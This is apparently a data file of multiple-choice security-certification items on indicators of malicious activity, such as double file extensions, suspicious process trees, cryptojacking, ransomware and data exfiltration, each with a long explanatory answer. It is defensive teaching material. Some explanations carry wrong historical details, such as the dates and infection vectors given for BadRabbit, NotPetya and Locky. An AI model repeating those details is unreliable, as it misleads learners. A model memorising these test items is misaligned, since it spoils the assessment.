Files with double extensions like document.pdf.exe or image.jpg.scr indicate what?|Compressed file|Malware disguise technique|Backup file|System file|1|Files with double extensions like "document.pdf.exe," "invoice.docx.exe," or "photo.jpg.scr" are classic malware disguise techniques exploiting Windows' default behavior of hiding known file extensions. Users see "document.pdf" in Windows Explorer (the true .exe is hidden) and assume it's a legitimate PDF, but double-clicking executes the malware. This social engineering technique is used in: phishing email attachments, malicious downloads, USB drop attacks, and file-sharing sites. Common malicious extensions hidden by Windows include: .exe (executable), .scr (screensaver, actually executable), .com (command file), .bat (batch script), .vbs (VBScript), .pif (Program Information File), and .js (JavaScript). The 2017 Locky ransomware extensively used .js and .vbs double extensions. Additional indicators include: files with suspicious icons (executable with PDF icon), files in unusual locations (%TEMP%, Downloads), unsolicited attachments, and files from untrusted sources. Prevention requires: configuring Windows to show all file extensions (Folder Options), training users to recognize double extensions, blocking dangerous file types at email gateway, checking file signatures (magic bytes) not just extensions, and using antivirus with behavioral detection. Organizations should implement application control policies blocking execution from user-writable directories.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Unusual parent-child process relationships (e.g., Word.exe spawning PowerShell.exe) indicate what?|Normal operation|Process injection or macro execution|Software update|Printing document|1|Unusual parent-child process relationships, such as Microsoft Word spawning PowerShell, Excel launching cmd.exe, or svchost.exe creating unexpected child processes, are strong indicators of malicious activity through process injection, exploitation, or macro-based malware. Legitimate process hierarchies follow predictable patterns (e.g., explorer.exe spawning user applications), but malware disrupts these patterns by: executing malicious macros in Office documents, exploiting vulnerabilities to spawn unexpected processes, injecting code into legitimate processes, and creating reverse shells from compromised applications. The 2017 NotPetya ransomware used Office macros spawning PowerShell for initial infection. Common suspicious relationships include: Office applications → PowerShell/cmd.exe, browsers → wscript.exe, services → interactive applications, and system processes → user applications. Process monitoring tools like Sysmon (Event ID 1 for process creation, ID 10 for process access) and EDR solutions track parent-child relationships. Investigation involves: identifying the parent process initiating suspicious behavior, analyzing command-line arguments, checking process creation timestamps, reviewing loaded DLLs, and examining process memory. Organizations should: disable macros by default, implement application control policies, enable attack surface reduction rules, and use behavioral analytics to detect anomalous process trees.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Executables running from temporary directories (%TEMP%, %APPDATA%, C:\Users\*\Downloads) indicate what?|Software installation|Malware execution|User downloads|System update|1|Executables running from temporary directories like %TEMP%, %APPDATA%, %LOCALAPPDATA%, or Downloads folders are common indicators of malware execution. Legitimate software installs from temporary locations but typically moves to Program Files; malware prefers temporary directories because: users have write permissions (no admin rights needed), antivirus may trust user directories more, installation detection is reduced, cleanup is easier for attackers, and many users never check temporary folders. Ransomware, banking trojans, and remote access tools (RATs) frequently execute from: C:\Users\[username]\AppData\Local\Temp, C:\Users\[username]\AppData\Roaming, C:\Windows\Temp, and C:\Users\[username]\Downloads. The Emotet malware drops payloads in %APPDATA% with random names. Additional indicators include: executables with random names (random8char.exe, temp_12345.exe), unsigned or untrusted code signatures, processes making network connections, and executables created recently. Organizations should: implement application control policies blocking execution from user-writable directories (AppLocker, Windows Defender Application Control), monitor for suspicious process creation from these locations, educate users about running downloaded files, and use endpoint detection tools. Some legitimate software (portable apps) also runs from these locations, requiring context-based analysis.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Registry keys with names containing Unicode or special characters indicate what?|Internationalization|Evasion technique|Configuration setting|Language pack|1|Registry keys using Unicode characters, special symbols, null bytes, or zero-width characters are evasion techniques to hide malicious registry entries from administrators and security tools. Attackers use these techniques to: make keys invisible or unselectable in Registry Editor (regedit), evade search tools looking for known malicious key names, prevent easy deletion, confuse forensic analysts, and bypass registry monitoring solutions. Examples include: keys with trailing spaces, keys using Cyrillic or Chinese characters that look like English (homoglyph attacks), keys with embedded null bytes, keys using right-to-left override (RTLO) characters, and keys with zero-width characters. The 2016 "BadRabbit" ransomware used registry keys with special characters. These entries may be: completely invisible in regedit UI, appear as blank entries, cause errors when attempting access, or display incorrectly depending on system locale. Detection requires: using PowerShell or programmatic registry access (not just regedit GUI), checking for non-ASCII characters in key names, comparing binary registry dumps, and using specialized forensic tools. Organizations should implement: registry integrity monitoring, baseline comparisons, and regular audits. Legitimate internationalized applications may use Unicode, but in security contexts it's highly suspicious.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Port scans showing sequential connection attempts to many ports on a system indicate what?|Network diagnostics|Reconnaissance activity|Software updates|Backup operation|1|Port scans showing sequential or randomized connection attempts to many ports indicate reconnaissance activity, where attackers map available services, identify vulnerable applications, fingerprint operating systems, and find potential attack vectors. Port scanning is typically the first phase of a targeted attack after initial network access. Common scanning patterns include: SYN scans (half-open connections), full TCP connect scans, UDP scans, and stealth scans. Tools like Nmap, Masscan, and Zmap are used by both attackers and security professionals. Indicators of malicious scanning include: scans originating from internal systems (indicating compromise), scans targeting critical infrastructure, scans followed by exploitation attempts, scans from suspicious geographic locations, and scans outside change control windows. The 2017 WannaCry ransomware scanned for open SMB ports (445) before exploitation. Network-based IDS/IPS (Snort, Suricata) detect scanning patterns. Organizations should: monitor for scanning activity, investigate internal scan sources immediately, implement network segmentation to limit scan effectiveness, use host-based firewalls, disable unnecessary services, and correlate scans with other IOCs. Legitimate vulnerability scanning should be scheduled, documented, and originate from known security tools. Unexpected scanning requires immediate investigation.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

A cryptocurrency mining process consuming high CPU resources indicates what?|Authorized mining|Cryptojacking malware|Video rendering|Scientific computation|1|Unauthorized cryptocurrency mining processes (cryptojacking malware) consuming high CPU/GPU resources indicate system compromise for profit. Cryptominers turn infected systems into mining farms for cryptocurrencies like Monero (XMR), favored for: privacy features, CPU-mining profitability, and difficult attribution. Cryptojacking is extremely prevalent because it's: low-risk for attackers (users often don't notice), profitable with enough infected systems, persistent (runs continuously), and less confrontational than ransomware. Infamous examples include the Coinhive JavaScript miner (embedded in compromised websites) and the 2018 Jenkins server cryptomining campaigns. Indicators include: sustained high CPU usage (70-100%), systems running hot or fans constantly running, process names mimicking legitimate processes (svchost.exe, System, Windows Update), connections to mining pools, and performance degradation. Cryptominers may: use CPU throttling to avoid detection, operate only during off-hours, or activate based on user idle time. Detection involves: monitoring CPU usage anomalies, checking running processes, analyzing network connections to known mining pools, and using antivirus/EDR. Prevention requires: patching vulnerabilities used for initial compromise, blocking mining pool domains, implementing application control, and educating users about browser-based miners.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Multiple systems showing similar unusual behaviors simultaneously indicates what?|Scheduled updates|Worm propagation|Configuration management|User training|1|Multiple systems exhibiting similar unusual behaviors simultaneously (mass infections) strongly indicate worm propagation or coordinated malware campaigns exploiting shared vulnerabilities. Worms self-replicate across networks automatically without user interaction, spreading rapidly through: network shares (SMB), email, removable media, vulnerabilities (EternalBlue), and weak credentials. Famous worm outbreaks include: 2017 WannaCry (200,000+ systems in 150 countries in 4 days), 2003 Slammer worm (75,000 systems in 10 minutes), 2001 Code Red (359,000 systems), and 2004 Sasser worm. Simultaneous indicators across multiple systems include: same malware detected on many hosts, similar network traffic patterns, synchronized infection timestamps, identical registry modifications, and mass system crashes or reboots. This differs from targeted attacks progressing system-by-system via lateral movement. Response requires: immediate network segmentation to contain spread, identifying patient zero (first infected system), patching the exploited vulnerability across all systems, coordinated malware removal, and forensic analysis. Organizations should: monitor for mass anomalies, implement network segmentation limiting worm spread, maintain patch management, and have incident response plans for mass incidents. Automated configuration management (SCCM, Ansible) also causes simultaneous changes but is scheduled and documented.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Files being encrypted with .encrypted, .locked, or random extensions and ransom notes appearing indicate what?|Backup operation|Ransomware infection|File compression|Disk error|1|Files being renamed with extensions like .encrypted, .locked, .crypted, or random strings (e.g., .wncry, .locky) accompanied by ransom notes (README.txt, HOW_TO_DECRYPT.html) are unmistakable indicators of ransomware infection. Ransomware encrypts files using strong cryptography (AES, RSA) and demands payment (usually cryptocurrency like Bitcoin, Monero) for decryption keys. Modern ransomware variants include: WannaCry (2017, .wncry), Locky (.locky, .odin, .zepto), Ryuk (targeted, high ransom), REvil/Sodinokibi (ransomware-as-a-service), Maze (data exfiltration + encryption), and Conti. Double extortion tactics threaten to publish stolen data if ransom isn't paid. Ransomware impacts include: complete data loss if no backups, business disruption (downtime), reputational damage, regulatory fines (if personal data exposed), and ransom payments (often $100K+ for businesses). Immediate response: isolate affected systems from network, do NOT pay ransom (no guarantee of decryption, funds terrorists), disconnect mapped drives, disable local administrator accounts, identify ransomware variant (no-more-ransom.org may have free decryptors), restore from offline backups, and report to law enforcement. Prevention: offline/immutable backups, endpoint protection, email filtering, patch management, least privilege, and network segmentation.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Users reporting browser redirects to unexpected websites or search engines indicate what?|ISP hijacking|Browser hijacker malware|DNS configuration|Network issue|1|Browser redirects to unexpected websites or search engines (different from user's configured settings) indicate browser hijacker malware that modifies browser settings to: generate advertising revenue through forced traffic, track browsing habits for data theft, distribute additional malware, conduct phishing via fake search results, and redirect users to malicious websites. Browser hijackers typically modify: default search engine, homepage, new tab page, browser shortcuts (adding command-line parameters), DNS settings, proxy configurations, and install malicious browser extensions. Common hijackers include: Conduit Search, MyWebSearch, Ask Toolbar, and Babylon Toolbar. Infection vectors include: bundled software installations, fake software updates (especially Adobe Flash), malicious browser extensions, and drive-by downloads. Symptoms include: unexpected search redirects (Google searches redirect through hijacker), new toolbars appearing, homepage changed without permission, pop-ups and ads on sites that normally don't have them, and slow browser performance. Removal requires: uninstalling suspicious programs, resetting browser settings, removing malicious extensions, checking DNS and proxy settings, scanning with anti-malware tools, and checking browser shortcut properties for appended parameters. Prevention involves: downloading software from official sources only, reading installation prompts carefully, and keeping browsers updated.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

System performance degradation coinciding with new software installations indicates what?|Hardware failure|Potentially unwanted program|Normal behavior|Driver issue|1|System performance degradation (slowdowns, high resource usage, crashes) immediately following new software installations often indicates potentially unwanted programs (PUPs), bundled malware, or resource-intensive applications. PUPs are software with questionable behavior that users may not have knowingly agreed to install, including: adware, browser hijackers, system optimizers (often fake), search toolbars, and download managers. Performance impacts include: constant background processes, memory consumption, network bandwidth usage, disk activity, startup slowdowns, and browser performance degradation. Software bundling tricks users by: pre-checking optional software in installation wizards, using "Express" vs. "Custom" installation (Express installs everything), hiding bundled software in terms of service, and using confusing language ("Recommended" installations including unwanted software). The 2015 SourceForge bundling controversy and CNET Download.com installer wrappers are notorious examples. Users should: download software from official sources only, choose Custom installation, uncheck additional software offers, read all installation screens, and research unfamiliar software names before proceeding. Post-installation investigation: check recently installed programs (Control Panel, Programs and Features, sorted by Install Date), review startup programs (Task Manager, Startup tab), scan with anti-malware tools (Malwarebytes, AdwCleaner), and uninstall suspicious recent installations. Organizations should use application control policies preventing unauthorized software.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Network traffic analysis showing data transferred in chunks at regular intervals indicates what?|Video streaming|Data exfiltration|Software updates|Cloud backup|1|Network traffic showing data transferred in regular-sized chunks at consistent intervals indicates controlled data exfiltration, where attackers slowly extract stolen data to evade detection by: staying below bandwidth thresholds, avoiding traffic spikes that trigger alerts, blending with normal business traffic, and minimizing performance impact that users might notice. This technique is characteristic of advanced persistent threats (APTs) conducting long-term espionage rather than smash-and-grab attacks. Attackers may: schedule transfers during business hours (blend with legitimate traffic), use approved protocols and ports (HTTPS 443, DNS 53), compress and encrypt data before transfer, and implement bandwidth throttling. The 2014 Sony Pictures hack involved 100TB exfiltrated over weeks; the 2015 OPM breach exfiltrated 21.5 million records gradually. Detection requires: establishing network traffic baselines, monitoring for sustained connections to unusual destinations, identifying regular traffic patterns inconsistent with business needs, analyzing traffic content with DLP, and correlating with other IOCs. Network behavioral analytics and UEBA solutions can identify anomalous regular patterns. Organizations should: implement DLP solutions, monitor outbound traffic, use egress filtering, segment networks, and encrypt sensitive data at rest (making exfiltration harder). While legitimate cloud backups and updates also show regular patterns, they should be documented, scheduled, and to known destinations.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity

Webcam or microphone indicators activating without user action indicate what?|System check|Spyware or RAT|Driver update|Application testing|1|Webcam or microphone indicators (LED lights) activating without user action strongly indicate spyware, remote access trojans (RATs), or stalkerware monitoring victims without consent. These tools enable attackers to: capture audio/video for espionage or blackmail, monitor physical spaces, record conversations, steal sensitive information visible on camera, and conduct intimate partner surveillance. Notable RATs with audio/video capabilities include: BlackShades, DarkComet, Blackhole RAT, and njRAT. The 2013 Miss Teen USA webcam hacking case involved a RAT capturing photos over months. Commercial stalkerware like FlexiSpy, mSpy, and SpyFone are marketed for "parental control" but used for domestic surveillance abuse. Indicators include: webcam LED lighting unexpectedly, microphone in use indicator (Windows taskbar), unknown applications accessing camera/mic (Settings → Privacy), files created in webcam folders when camera shouldn't be active, and network traffic during supposed inactive periods. Some sophisticated malware can disable LED indicators entirely. Protection requires: covering webcams when not in use (physical privacy covers), reviewing application permissions regularly, monitoring active processes, keeping antivirus updated, and using network monitoring to detect unauthorized data uploads. Organizations should implement: DLP monitoring for unauthorized device access, endpoint detection for RATs, and security awareness training about physical privacy. Check camera/microphone permissions: Windows Settings → Privacy → Camera/Microphone.|2.0 Threats, Vulnerabilities, and Mitigations|2.4 Indicators of Malicious Activity
